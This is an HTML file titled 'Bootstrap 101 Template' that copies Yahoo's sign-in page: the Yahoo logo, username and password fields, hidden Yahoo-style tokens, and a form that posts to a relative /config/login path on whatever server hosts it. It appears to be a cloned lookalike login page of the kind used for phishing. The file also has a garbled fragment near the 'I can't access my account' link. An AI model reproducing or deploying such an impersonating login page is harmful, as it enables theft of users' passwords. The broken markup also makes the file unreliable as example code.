<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Bootstrap 101 Template</title>

<!-- Bootstrap -->
<link href="css/bootstrap.min.css" rel="stylesheet">

<link
	href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css"
	rel="stylesheet">
<link href="css/style.css" rel="stylesheet">


</head>
<body>
	<div id="mbr-login-box" class="mbr-login-box">
		<!-- Y LOGO HERE -->
		<div class="mbr-login-logo">
			<img src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png">
		</div>


		<!-- SIGNIN FORM -->
		<fieldset id="mbr-login-fieldset"
			class="mbr-login-fieldset pure-group">
			<div id="mbr-login-error"
				class="mbr-login-error mbr-text-align pure-u-1 mbr-hide"></div>
			<form id="mbr-login-form" method="POST"
				action="/config/login?.intl=us&.src=openid&.partner=&.pd=c%3DmZmAFpe.2e7WuWzcHD2ZPYQ-%26ockey%3Dopenid-demo.appspot.com%26op%3D0.&occrumb=NzCv1NpoFWt&.done=https%3A%2F%2Fopen.login.yahoo.com%2Fopenid%2Fop%2Fstart%3Fz%3DGlS86edgfQJjL5DRusNb4kwkFuEa8aRkapZ_pN.GhL3sXiZxjkD2QA_fJxSq6OOzbMKaiJsL9rNCb42O5IX3SOug40P9XM_yB_MiAOjKcWgJuOcAnobgQRjcc4MkaiCK9qAiN7WvMq3IpfvUlBPsBOm_zjasSeBdfcNS7Vw_5Qm8t022RDgB_k84LA1vtY3_QQpTLMdIuAaSJsZPi4YEP17GNgQL3CIKET5FtKYh4XSwjaMhFqH0unhVmHGnGL0VP4fTQqubRTun1PvQNDZeLN2dnsieP8z1vILTyTanpCaUsMTNC4Bo8RQ9FwCJd8QtsSzeQs0TCJvUUrPBrh0RLekUGtI3VFk1iWvZLL6z9hCkFYj4s3ZMw5clv_mri9CkWmVyH6mSVjYTsQxkgzzEcgnSkv2UtpjzzS6xQtXYXS1gE.h0n5M_WkBz.bqEz_pwr484yFJnMbg9hxJDrGja.5CyXw--%26.scrumb%3D0"
				class="pure-form pure-form-stacked mbr-login-form">
				<div id="inputs">
					<div class="mbr-login-username">
						<!-- username -->
						<label for="login-username" class="mbr-hide">Username</label> <input
							name="username" id="login-username" class="login-input pure-u-1 "
							type="text" maxlength="96" tabindex="1" aria-required="true"
							value="" placeholder="Yahoo username" title="Yahoo username"
							autocorrect="off" autofocus>
						<div id="login-username-error"
							class="error-box username-error pure-u-1 mbr-text-align mbr-hide"
							role="alert"></div>
					</div>

					<div class="mbr-login-username-tips"></div>

					<label for="login-passwd" class="mbr-hide">Password</label> <input
						name="passwd" id="login-passwd" class="login-input  pure-u-1"
						type="password" maxlength="64" tabindex="2" aria-required="true"
						placeholder="Password" title="Password" autocorrect="off">
				</div>
				<div id="persistency" class="mbr-login-checkbox">
					<div class="mbr-text-align mbr-login-text-normal">
						<input id="persistent" name=".persistent" value="y"
							class="checkbox" type="checkbox" tabindex="3"> <label
							for="persistent">Keep me signed in</label>
					</div>
				</div>

				<div id="submits" class="mbr-login-submit">
					<button id="login-signin" name="signin" type="submit"
						class="pure-u-1 pure-button mbr-button-primary" tabindex="4">Sign
						In</button>
				</div>

				<div id="hiddens" class="hidden">
					<input name="_crumb" type="hidden" value="Vm0VkNpQQof"> <input
						name="_ts" type="hidden" value="1420702091"> <input
						name="_format" type="hidden" value=""> <input name="_uuid"
						type="hidden" value="UOX185mKwdQi"> <input name="_seqid"
						type="hidden" value="2">
				</div>
				<!-- popup -->
				<div class="mbr-login-popup-container">
					<div id="mbr-login-popup" class="mbr-login-popup mbr-hide">
						<div class="yui3-widget-hd mbr-text-align"></div>
						<div class="yui3-widget-bd mbr-text-align pure-g"></div>
					</div>
				</div>
			</form>
		</fieldset>

				class="mbr-login-forgot-link pure-u-1">I can't access my account</a>
			<a id="helpLnk"
				href="/config/login?.intl=us&.src=openid&.partner=&.pd=c%3DmZmAFpe.2e7WuWzcHD2ZPYQ-%26ockey%3Dopenid-demo.appspot.com%26op%3D0.&occrumb=NzCv1NpoFWt&.done=https%3A%2F%2Fopen.login.yahoo.com%2Fopenid%2Fop%2Fstart%3Fz%3DGlS86edgfQJjL5DRusNb4kwkFuEa8aRkapZ_pN.GhL3sXiZxjkD2QA_fJxSq6OOzbMKaiJsL9rNCb42O5IX3SOug40P9XM_yB_MiAOjKcWgJuOcAnobgQRjcc4MkaiCK9qAiN7WvMq3IpfvUlBPsBOm_zjasSeBdfcNS7Vw_5Qm8t022RDgB_k84LA1vtY3_QQpTLMdIuAaSJsZPi4YEP17GNgQL3CIKET5FtKYh4XSwjaMhFqH0unhVmHGnGL0VP4fTQqubRTun1PvQNDZeLN2dnsieP8z1vILTyTanpCaUsMTNC4Bo8RQ9FwCJd8QtsSzeQs0TCJvUUrPBrh0RLekUGtI3VFk1iWvZLL6z9hCkFYj4s3ZMw5clv_mri9CkWmVyH6mSVjYTsQxkgzzEcgnSkv2UtpjzzS6xQtXYXS1gE.h0n5M_WkBz.bqEz_pwr484yFJnMbg9hxJDrGja.5CyXw--%26.scrumb%3D0&.help=1"
				class="mbr-login-help-link pure-u-1">Help</a>
		</div>

		<div
			class="mbr-login-separator-small mbr-login-create-account mbr-login-partner- pure-g">
			<!--<div class="mbr-login-separator-title pure-u-1"><span class="mbr-separator-or">OR</span></div>-->
			<div class="pure-u-1">
				<a
					href="https://edit.yahoo.com/registration?.lang=en-US&.intl=us&.done=https%3A%2F%2Fopen.login.yahoo.com%2Fopenid%2Fop%2Fstart%3Fz%3DGlS86edgfQJjL5DRusNb4kwkFuEa8aRkapZ_pN.GhL3sXiZxjkD2QA_fJxSq6OOzbMKaiJsL9rNCb42O5IX3SOug40P9XM_yB_MiAOjKcWgJuOcAnobgQRjcc4MkaiCK9qAiN7WvMq3IpfvUlBPsBOm_zjasSeBdfcNS7Vw_5Qm8t022RDgB_k84LA1vtY3_QQpTLMdIuAaSJsZPi4YEP17GNgQL3CIKET5FtKYh4XSwjaMhFqH0unhVmHGnGL0VP4fTQqubRTun1PvQNDZeLN2dnsieP8z1vILTyTanpCaUsMTNC4Bo8RQ9FwCJd8QtsSzeQs0TCJvUUrPBrh0RLekUGtI3VFk1iWvZLL6z9hCkFYj4s3ZMw5clv_mri9CkWmVyH6mSVjYTsQxkgzzEcgnSkv2UtpjzzS6xQtXYXS1gE.h0n5M_WkBz.bqEz_pwr484yFJnMbg9hxJDrGja.5CyXw--%26.scrumb%3D0&.src=openid"
					id="login-signup"> <span
					class="pure-button mbr-button-blue pure-u-1">Create Account</span>
				</a>
			</div>
		</div>
	</div>
	    
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="js/jquery.js"></script>

    <script src="js/bootstrap.min.js"></script>
  </body>
</html>
